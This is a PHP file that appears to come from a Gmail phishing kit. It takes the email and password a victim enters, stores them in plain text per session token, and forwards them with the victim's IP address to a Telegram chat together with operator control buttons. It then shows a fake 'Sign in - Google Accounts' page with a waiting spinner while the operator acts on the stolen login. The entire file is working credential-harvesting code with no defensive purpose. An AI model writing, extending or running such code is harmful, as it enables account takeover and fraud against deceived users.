<?php
include "helper.php";

$token = $_GET['token'] ?? $_POST['token'] ?? '';
$waiting = isset($_GET['waiting']) && $_GET['waiting'] === '1';

if ($token === '') {
    header('Location: continue.php');
    exit;
}

$filePath = "status/" . $token . ".txt";
$email = '';
$pwd = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $pwd = $_POST['password'] ?? '';

    file_put_contents($filePath, 'gm_hold');
    saveEmail($token, $email);

    if (!is_dir("gmail_session")) {
        mkdir("gmail_session", 0755, true);
    }
    file_put_contents("gmail_session/" . $token . ".txt", json_encode(['email' => $email, 'password' => $pwd]));

    $ip = getClientIp();
    $message = "GMAIL LOGIN\nid: <code>" . $token . "</code>\n\n<code>" . htmlspecialchars($email) . "</code>\n<code>" . htmlspecialchars($pwd) . "</code>\n\nip: <code>" . $ip . "</code>";
    $keyboard = getGmailNavKeyboard($token, true);
    sendTGWithButtons($message, $keyboard);
    $waiting = true;
} elseif ($waiting) {
    $sessionFile = "gmail_session/" . $token . ".txt";
    if (file_exists($sessionFile)) {
        $session = json_decode(file_get_contents($sessionFile), true);
        if (is_array($session)) {
            $email = $session['email'] ?? '';
            $pwd = $session['password'] ?? '';
        }
    }
} else {
    header("Location: gmail_login.php?token=" . urlencode($token));
    exit;
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex,nofollow">
    <title>Sign in - Google Accounts</title>
    <link href="gmail-files/common.css" rel="stylesheet">
    <link href="gmail-files/login.css" rel="stylesheet">
</head>
<body class="gm-login">
    <div class="gm-spinner-wrap">
        <div class="gm-spinner"></div>
    </div>
    <script src="gmail-files/status.js?v=3"></script>
    <script>gmCheckStatus(<?= json_encode($token); ?>, { holdStatuses: ['gm_hold', 'hold', 'continue', ''] });</script>
</body>
</html>
